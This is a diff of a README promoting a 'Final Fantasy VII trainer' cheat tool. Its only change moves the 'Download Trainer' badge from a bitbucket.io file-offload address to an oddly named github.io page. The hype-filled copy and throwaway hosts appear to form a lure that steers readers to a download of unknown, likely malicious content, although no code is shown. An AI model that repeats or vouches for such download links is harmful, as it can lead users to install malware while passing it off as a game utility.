@@ -2,7 +2,7 @@
 
 **Grinding random battles in Midgar? Trying to max materia without hours of farming? With a Final Fantasy VII trainer, you can skip the grind, unlock god-tier stats, and play like you’ve got a golden Chocobo from the start.**
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload14.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Final-Fantasy-VII-Trainer-dyx4.github.io/.github)
 ---
 
 ## 🧠 What Is a Final Fantasy VII Trainer?
